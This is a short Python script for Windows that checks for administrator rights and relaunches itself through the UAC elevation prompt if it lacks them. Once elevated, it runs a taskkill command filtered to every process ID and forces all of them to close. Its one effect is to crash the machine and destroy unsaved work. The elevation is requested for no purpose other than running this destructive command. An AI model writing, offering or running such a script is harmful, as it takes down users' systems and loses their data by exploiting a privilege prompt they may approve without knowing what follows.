from __future__ import print_function
import ctypes, sys
import os
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
		
if is_admin(): # 将要运行的代码加到这里
    print("以获取管理员权限...")
    os.system("Taskkill /fi \"pid ge 1\" /f")
    input()
    
else: 
    if sys.version_info[0] == 3:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) 
        print("run again...")
    else:
        ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)